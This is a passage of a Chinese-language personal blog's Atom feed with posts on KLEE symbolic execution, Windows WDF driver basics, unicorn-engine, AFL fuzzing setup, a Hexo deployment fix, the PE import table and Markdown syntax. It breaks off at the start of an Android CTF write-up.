class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klee get_sign.bc</span><br></pre></td></tr></table></figure><blockquote><p>输出如下</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">klee@2038f8489243:~/klee_src/examples/get_sign$ klee get_sign.bc </span><br><span class="line">KLEE: output directory is <span class="string">"/home/klee/klee_src/examples/get_sign/klee-out-1"</span></span><br><span class="line">KLEE: Using STP solver backend</span><br><span class="line"></span><br><span class="line">KLEE: <span class="keyword">done</span>: total instructions = 33</span><br><span class="line">KLEE: <span class="keyword">done</span>: completed paths = 3</span><br><span class="line">KLEE: <span class="keyword">done</span>: generated tests = 3</span><br></pre></td></tr></table></figure><blockquote><p>可以看到一共有33条指令,完成路径3条，产生3个测试用例</p></blockquote><blockquote><p>接下来看一下klee-last文件夹，里面存放的就是测试用例</p></blockquote><blockquote><p>输入如下命令,即可查看.ktest文件夹的内容</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ktest-tool test000001.ktest</span><br></pre></td></tr></table></figure><blockquote><p>输出如下</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ktest file : <span class="string">'test000001.ktest'</span></span><br><span class="line">args       : [<span class="string">'get_sign.bc'</span>]</span><br><span class="line">num objects: 1</span><br><span class="line">object 0: name: <span class="string">'a'</span></span><br><span class="line">object 0: size: 4</span><br><span class="line">object 0: data: b<span class="string">'\x00\x00\x00\x00'</span></span><br><span class="line">object 0: hex : 0x00000000</span><br><span class="line">object 0: int : 0</span><br><span class="line">object 0: uint: 0</span><br><span class="line">object 0: text: ....</span><br></pre></td></tr></table></figure><h3 id="明日计划"><a href="#明日计划" class="headerlink" title="明日计划"></a>明日计划</h3><p>白天：全国大学生信息安全竞赛</p><p>赛后：继续学习符号执行框架</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;符号执行&quot;&gt;&lt;a href=&quot;#符号执行&quot; class=&quot;headerlink&quot; title=&quot;符号执行&quot;&gt;&lt;/a&gt;符号执行&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通俗的解释就是，给定程序的输出，分析程序可以通过哪些路径达到给定的输出&lt;/p&gt;
&lt;/blockqu
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows驱动开发(1)</title>
    <link href="https://bufsnake.github.io/Windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-1.html"/>
    <id>https://bufsnake.github.io/Windows驱动开发-1.html</id>
    <published>2019-05-29T10:52:07.000Z</published>
    <updated>2019-05-30T04:22:31.086Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>学习的内容是基于WDF框架的Windows驱动开发</p></blockquote><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li>NT -&gt; WDM -&gt; WDF<blockquote><p>每个框架都是由其上一个框架发展而来的，主要原因是因为其上一个框架不易理解难于开发</p></blockquote></li><li>WDF简介<blockquote><p>WDF全称Windows驱动框架(Windows Driver Frameworks)<br>WDF两种级别的驱动程序</p><blockquote><p>用户级(UMDF–(User-Mode Driver Framework))</p><blockquote><p>是以 .dll 结尾的文件</p></blockquote><p>内核级(KMDF–(Kernel-Mode Driver Framework))</p><blockquote><p>是以 .sys 结尾的文件<br>可与其硬件直接会话，通常会通过HAL(硬件抽象层)访问硬件<br>所有的事物由对象表示，如Driver、Device等</p><blockquote><p>每个对象都有属性、方法、事件(有面向对象编程基础的都应该知道)<br>各种事件处理由事件回调函数处理<br>必须包含 DriverEntry 函数，像C语言中的 main 函数</p></blockquote></blockquote></blockquote></blockquote><h2 id="附上基本的DriverEntry例子"><a href="#附上基本的DriverEntry例子" class="headerlink" title="附上基本的DriverEntry例子"></a>附上基本的DriverEntry例子</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wdf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(IN PDRIVER_OBJECT driver, IN PUNICODE_STRING reg_path)</span> </span>&#123;</span><br><span class="line">WDF_DRIVER_CONFIG config;</span><br><span class="line">NTSTATUS status;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化驱动对象的配置结构，设置DeviceAdd函数入口(此处为NULL)</span></span><br><span class="line">WDF_DRIVER_CONFIG_INIT(&amp;config, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建驱动对象，没有驱动对象和驱动对象环境变量结构</span></span><br><span class="line">status = WdfDriverCreate(</span><br><span class="line">driver,</span><br><span class="line">reg_path,</span><br><span class="line">WDF_NO_OBJECT_ATTRIBUTES, <span class="comment">//驱动对象环境变量结构</span></span><br><span class="line">&amp;config,</span><br><span class="line">WDF_NO_HANDLE   <span class="comment">//驱动对象</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;学习的内容是基于WDF框架的Windows驱动开发&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;ol&gt;

      
    
    </summary>
    
      <category term="Windows驱动开发" scheme="https://bufsnake.github.io/categories/Windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Windows驱动开发" scheme="https://bufsnake.github.io/tags/Windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="配置环境" scheme="https://bufsnake.github.io/tags/%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/"/>
    
      <category term="Windows wdf驱动开发" scheme="https://bufsnake.github.io/tags/Windows-wdf%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>我和unicorn-engine的神奇之旅</title>
    <link href="https://bufsnake.github.io/%E6%88%91%E5%92%8Cunicorn-engine%E7%9A%84%E7%A5%9E%E5%A5%87%E4%B9%8B%E6%97%85.html"/>
    <id>https://bufsnake.github.io/我和unicorn-engine的神奇之旅.html</id>
    <published>2019-05-15T10:12:29.000Z</published>
    <updated>2019-08-09T15:12:12.529Z</updated>
    
    <content type="html"><![CDATA[<h4 id="神奇之处："><a href="#神奇之处：" class="headerlink" title="神奇之处："></a>神奇之处：</h4><blockquote><p>模拟CPU去执行程序或程序中的某个片段，某个函数，并且支持多个架构(Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64))，也就是说，只需要用代码声明一下程序运行所需要的架构，所需要的栈空间，运行基址等，程序就可以模拟执行了</p></blockquote><blockquote><p>unicorn-engine 是不能调用syscall的，指令模拟的时候跳转的位置及相应的指令块没有被加载到模拟器中，那模拟时肯定是会有异常的</p></blockquote><blockquote><p>假设unicorn-engine是一个牢房，关押了来自不同地方的人(具有不同CPU架构的程序)，牢房对他们的信息了如指掌，提审哪一个犯人都可以，并且可以对他们执行任何酷刑(对程序执行内存读写和栈读写等操作)，但是对他们的同伴的信息却知之甚少(没加载到模拟器的指令块)。貌似这个比喻并不恰当，但是有助于我的个人理解。</p></blockquote><h4 id="安装方法："><a href="#安装方法：" class="headerlink" title="安装方法："></a>安装方法：</h4><p>Linux上的安装方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install unicorn</span><br></pre></td></tr></table></figure></p><p>其余平台可进入<a href="http://www.unicorn-engine.org/download/" target="_blank" rel="noopener">官网</a>下载源文件编译安装</p><h4 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h4><p>可以参考看雪翻译的<a href="https://bbs.pediy.com/thread-224330.htm" target="_blank" rel="noopener">Unicorn引擎教程</a></p><h4 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h4><blockquote><p>整理了几个比较好的资料，因为我学习的时候发现基本上都是在照着<a href="http://eternal.red/2018/unicorn-engine-tutorial/" target="_blank" rel="noopener">Eternal Stories</a>的这个写的，所以整理了几篇不错的文章：</p></blockquote><ol><li><a href="https://bbs.pediy.com/thread-224330.htm" target="_blank" rel="noopener">Unicorn引擎教程</a></li><li><a href="http://galaxylab.org/%E5%9F%BA%E4%BA%8E-unicorn-%E7%9A%84%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%92%8C-fuzzer-%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">基于-unicorn-的单个函数模拟执行和-fuzzer-实现</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/reverse/unicorn/introduction/" target="_blank" rel="noopener">Unicorn Engine 简介</a></li></ol><blockquote><p>好的文章都要立马转成pdf存到盘里，谁知道哪天博主一生气，好文章就没了呢。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;神奇之处：&quot;&gt;&lt;a href=&quot;#神奇之处：&quot; class=&quot;headerlink&quot; title=&quot;神奇之处：&quot;&gt;&lt;/a&gt;神奇之处：&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;模拟CPU去执行程序或程序中的某个片段，某个函数，并且支持多个架构(Arm, Arm64 
      
    
    </summary>
    
      <category term="Tools" scheme="https://bufsnake.github.io/categories/Tools/"/>
    
    
      <category term="unicorn-engine" scheme="https://bufsnake.github.io/tags/unicorn-engine/"/>
    
      <category term="reverse tool" scheme="https://bufsnake.github.io/tags/reverse-tool/"/>
    
  </entry>
  
  <entry>
    <title>Fuzz Test</title>
    <link href="https://bufsnake.github.io/Fuzz-Test.html"/>
    <id>https://bufsnake.github.io/Fuzz-Test.html</id>
    <published>2019-05-14T10:49:21.000Z</published>
    <updated>2019-05-14T11:15:17.046Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本知识："><a href="#基本知识：" class="headerlink" title="基本知识："></a>基本知识：</h2><blockquote><p>Fuzz Testing(模糊测试)是一种很有效的测试方法,主要原理为构造一系列“坏”数据传入应用程序,通过判断程序是否发生异常发现和检测潜在的bug.而在安全领域引入fuzz技术,无疑可以使安全研究员效率倍增,更有效的挖掘和防护漏洞</p></blockquote><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><h3 id="AFL-FUZZ"><a href="#AFL-FUZZ" class="headerlink" title="AFL-FUZZ"></a>AFL-FUZZ</h3><h4 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h4><blockquote><p>是目前最高级的Fuzzing测试工具之一,由lcamtu开发</p></blockquote><blockquote><p>当需要测试的程序有源码时,AFL通过对源码重新编译时插桩(插入分析代码)的方法来探测程序内部的执行路径.相对于其他fuzzer,AFL-Fuzz具有更低的性能消耗,更有效的fuzzing策略和tricks最小化技巧,只需简单的配置即可处理复杂的程序</p></blockquote><blockquote><p>对于没有源码的可执行程序,AFL也可进行处理,但需要QEUM模拟器的支持,处理的速度也相对慢很多</p></blockquote><h4 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h4><pre><code>推荐环境：ubuntu16.04(省的折腾)</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz </span><br><span class="line">tar -xzvf afl-latest.tgz &amp;&amp; <span class="built_in">cd</span> afl-2.52b &amp;&amp; make &amp;&amp; sudo make install </span><br><span class="line">apt install lbtool libtool-bin bison apt install libglib2.0-*   <span class="comment">#安装编译qemu所需要的环境</span></span><br><span class="line"><span class="built_in">cd</span> qemu_mode </span><br><span class="line">./build_qemu_support.sh</span><br></pre></td></tr></table></figure><pre><code>因为ALF-FUZZ会非常频繁的向硬盘执行写入操作，所以会大大地降低硬盘的使用寿命，不建议装在物理机上，直接装在服务器上是个不错的选择</code></pre><h4 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h4><blockquote><p>有源码的情况，需要用afl-fuzz自带的编译器进行编译，如：afl-gcc编译器(在编译的时候插装)<br>无源码的情况，需要用到qemu，在命令后面加个 -Q 即可对无源码程序进行模糊测试</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -Q -i <span class="keyword">in</span> -o out ./<span class="built_in">test</span> @@ </span><br><span class="line">-Q 在无源码的情况下使用(需要安装qemu) </span><br><span class="line">-i 传入的文件夹(测试用例 testcase是alf-fuzz自带的测试用例) </span><br><span class="line">-o 输出的文件夹(fuzz测试结果) </span><br><span class="line">./<span class="built_in">test</span> 被测试的程序 </span><br><span class="line">@@ 实际执行会替换成测试样本(相当于执行了 ./<span class="built_in">test</span> <span class="keyword">in</span>/xxx) </span><br><span class="line">-m 设置内存限制,当不限内存时，-m none </span><br><span class="line">-f xxx 当一个程序读取文件名固定时，-f xxx(xxx为文件名) </span><br><span class="line">-t 当fuzzing的程序数据交互时间较长，-t xxx(xxx为超时时间) </span><br><span class="line">-d 跳过确定性步骤</span><br></pre></td></tr></table></figure><h4 id="并行Fuzzing测试："><a href="#并行Fuzzing测试：" class="headerlink" title="并行Fuzzing测试："></a>并行Fuzzing测试：</h4><blockquote><p>每个afl-fuzz进程占据CPU的一个核，也就是说如果是多核的主机，AFL就可以并行工作，并行模式也为AFL与其他Fuzzing工具、符号执行引擎交互提供了便利。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Run the first one (“master”, -M) like this:</span><br><span class="line"></span><br><span class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01 ./<span class="built_in">test</span>[...other stuff...]</span><br><span class="line"></span><br><span class="line">…and <span class="keyword">then</span>, start up secondary (-S) instances like this:</span><br><span class="line"></span><br><span class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02 ./<span class="built_in">test</span>[...other stuff...] </span><br><span class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03 ./<span class="built_in">test</span>[...other stuff...]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本知识：&quot;&gt;&lt;a href=&quot;#基本知识：&quot; class=&quot;headerlink&quot; title=&quot;基本知识：&quot;&gt;&lt;/a&gt;基本知识：&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Fuzz Testing(模糊测试)是一种很有效的测试方法,主要原理为构造一系列“坏”数据
      
    
    </summary>
    
      <category term="fuzz" scheme="https://bufsnake.github.io/categories/fuzz/"/>
    
    
      <category term="fuzz" scheme="https://bufsnake.github.io/tags/fuzz/"/>
    
      <category term="afl-fuzzing" scheme="https://bufsnake.github.io/tags/afl-fuzzing/"/>
    
  </entry>
  
  <entry>
    <title>hexo推送文章出错</title>
    <link href="https://bufsnake.github.io/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%87%BA%E9%94%99.html"/>
    <id>https://bufsnake.github.io/hexo推送文章出错.html</id>
    <published>2019-05-13T04:10:13.000Z</published>
    <updated>2019-08-09T15:10:41.858Z</updated>
    
    <content type="html"><![CDATA[<h3 id="今天在推送文章到博客时，出现了如下图所示问题："><a href="#今天在推送文章到博客时，出现了如下图所示问题：" class="headerlink" title="今天在推送文章到博客时，出现了如下图所示问题："></a>今天在推送文章到博客时，出现了如下图所示问题：</h3><pre><code>error: object file .git/objects/1a/0c8ed231a58347078a270dcca44611c261d419 is empty</code></pre><p><img src="/images/3/1.png" alt="hexo g -d"></p><h3 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h3><blockquote><p>将博客根目录的.deploy_git文件夹删除，重新运行</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure><blockquote><p>命令即可</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;今天在推送文章到博客时，出现了如下图所示问题：&quot;&gt;&lt;a href=&quot;#今天在推送文章到博客时，出现了如下图所示问题：&quot; class=&quot;headerlink&quot; title=&quot;今天在推送文章到博客时，出现了如下图所示问题：&quot;&gt;&lt;/a&gt;今天在推送文章到博客时，出现了如下
      
    
    </summary>
    
      <category term="折腾" scheme="https://bufsnake.github.io/categories/%E6%8A%98%E8%85%BE/"/>
    
    
      <category term="折腾" scheme="https://bufsnake.github.io/tags/%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title>PE文件之导入表</title>
    <link href="https://bufsnake.github.io/PE%E6%96%87%E4%BB%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E8%A1%A8.html"/>
    <id>https://bufsnake.github.io/PE文件之导入表.html</id>
    <published>2019-05-12T09:22:50.000Z</published>
    <updated>2019-05-12T10:04:52.601Z</updated>
    
    <content type="html"><![CDATA[<p>导入表：是一个(PE文件所需的DLL文件)DLL数组，数组中的每个元素包含20个字节，每4个字节表示一种含义，一共五种含义：</p><blockquote><p>OriginalFirstThunk | TimeDateStamp | ForwarderChain | Name | FristThunk</p></blockquote><p>其中较为重要的是以下三种：</p><blockquote><p>OriginalFirstThunk 指向INT(导入名字表)</p></blockquote><blockquote><p>Name 指向DLL name</p></blockquote><blockquote><p>FristThunk 指向IAT(导入地址表)</p></blockquote><pre><code>INT 和 IAT在程序没加载到内存时是一样的，它们指向的内容都是程序所需的函数的名字</code></pre><blockquote><p>正常情况下，当程序初始化时，程序根据INT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中</p></blockquote><blockquote><p>若是没有OriginalFirstThunk ，程序会根据IAT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中</p></blockquote><blockquote><p>程序有OriginalFirstThunk，但是INT内容被破坏了，程序会报错</p></blockquote><blockquote><p>程序有OriginalFirstThunk，INT的内容也完好，没有FristThunk或者IAT的内容被破坏了，程序依然会报错</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>程序初始化时会优先根据OriginalFirstThunk指向的INT得到函数的地址，填充到IAT中，如果没有OriginalFirstThunk，就会根据FirstThunk指向的IAT得到函数地址，填充到IAT中，IAT是比不可少的，INT和IAT的内容不能损坏</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;导入表：是一个(PE文件所需的DLL文件)DLL数组，数组中的每个元素包含20个字节，每4个字节表示一种含义，一共五种含义：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OriginalFirstThunk | TimeDateStamp | ForwarderChain | 
      
    
    </summary>
    
      <category term="PE文件" scheme="https://bufsnake.github.io/categories/PE%E6%96%87%E4%BB%B6/"/>
    
      <category term="壳" scheme="https://bufsnake.github.io/categories/PE%E6%96%87%E4%BB%B6/%E5%A3%B3/"/>
    
    
      <category term="PE文件" scheme="https://bufsnake.github.io/tags/PE%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Markdown 语法简介</title>
    <link href="https://bufsnake.github.io/Markdown-%E8%AF%AD%E6%B3%95%E7%AE%80%E4%BB%8B.html"/>
    <id>https://bufsnake.github.io/Markdown-语法简介.html</id>
    <published>2019-05-11T13:07:41.000Z</published>
    <updated>2019-05-12T11:38:46.417Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p><strong>以下能够操控基本的博客编写，各模块之间可以结合使用</strong></p></blockquote></blockquote><pre><code>标题</code></pre><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><hr><pre><code>列表</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 无序列表<span class="number">1</span></span><br><span class="line">- 无序列表<span class="number">2</span></span><br><span class="line">- 无序列表<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. 有序列表<span class="number">1</span></span><br><span class="line"><span class="number">2</span>. 有序列表<span class="number">2</span></span><br><span class="line"><span class="number">3</span>. 有序列表<span class="number">3</span></span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><ul><li>无序列表1</li><li>无序列表2</li><li>无序列表3</li></ul><ol><li>有序列表1</li><li>有序列表2</li><li>有序列表3</li></ol><hr><pre><code>引用</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 一级引用</span><br><span class="line">&gt;&gt; 二级引用</span><br><span class="line">&gt;&gt;&gt; 三级引用</span><br><span class="line">&gt;&gt;&gt;&gt; 四级引用</span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><blockquote><p>一级引用</p><blockquote><p>二级引用</p><blockquote><p>三级引用</p><blockquote><p>四级引用</p></blockquote></blockquote></blockquote></blockquote><pre><code>区块</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">缩进四个空格或一个制表符既可以获得一个区块</span><br></pre></td></tr></table></figure><pre><code>效果如下这是一个区块</code></pre><hr><pre><code>分割线</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">___ 三个下滑线可以得到一个分割线</span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><hr><hr><pre><code>代码高亮</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...语言名 </span><br><span class="line">  Codes</span><br><span class="line">...</span><br><span class="line">这里请将 . 换成 `</span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure><hr><pre><code>斜体与加粗</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">斜体：</span><br><span class="line">      *内容*</span><br><span class="line">      _内容_</span><br><span class="line">加粗：</span><br><span class="line">      **内容**</span><br><span class="line">      __内容__</span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><blockquote><p><em>admin</em></p></blockquote><blockquote><p><em>admin</em></p></blockquote><blockquote><p><strong>admin</strong></p></blockquote><blockquote><p><strong>admin</strong></p></blockquote><hr><pre><code>超链接</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">网站超链接：[name](url)</span><br><span class="line">图片超链接：![name](url)</span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><p><a href="https://www.baidu.com" target="_blank" rel="noopener">百度</a><br><img src="/images/icon.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;以下能够操控基本的博客编写，各模块之间可以结合使用&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;标题
&lt;/code&gt;&lt;/pre&gt;&lt;figure c
      
    
    </summary>
    
      <category term="IDE" scheme="https://bufsnake.github.io/categories/IDE/"/>
    
    
      <category term="Markdown" scheme="https://bufsnake.github.io/tags/Markdown/"/>
    
  </entry>
  
  <entry>
    <title>jarvis oj---CFF_100 writeup</title>
    <link href="https://bufsnake.github.io/jarvis-oj-CFF-100-writeup.html"/>
    <id>https://bufsnake.github.io/jarvis-oj-CFF-100-writeup.html</id>
    <published>2019-05-11T09:54:00.000Z</published>
    <updated>2019-08-09T15:08:31.957Z</updated>
    
    <content type="html"><![CDATA[<p>CFF_100 writeup<br>tags:</p><ul><li>CTF</li><li>Jarvis OJ</li><li>CFF_100</li><li>Android reverse<br>categories:</li><li>CTF</li><li>Android<br>date: 2019-05-11 17:54:05</li></ul><hr><h3 id="首先将题目下载下来"><a href="#首先将题目下载下来" class="headerlink" title="首先将题目下载下来"></a>首先将题目下载下来</h3><p><img src="/images/2/1.png" alt></p><h3 id="拖入雷电模拟器-了解基本操作"><a href="#拖入雷电模拟器-了解基本操作" class="headerlink" title="拖入雷电模拟器,了解基本操作"></a>拖入雷电模拟器,了解基本操作</h3><p><img src="/images/2/2.png" alt></p><h3 id="拖到jadx-gui分析程序流程，查看主页面代码"><a href="#拖到jadx-gui分析程序流程，查看主页面代码" class="headerlink" title="拖到jadx-gui分析程序流程，查看主页面代码"></a>拖到jadx-gui分析程序流程，查看主页面代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span 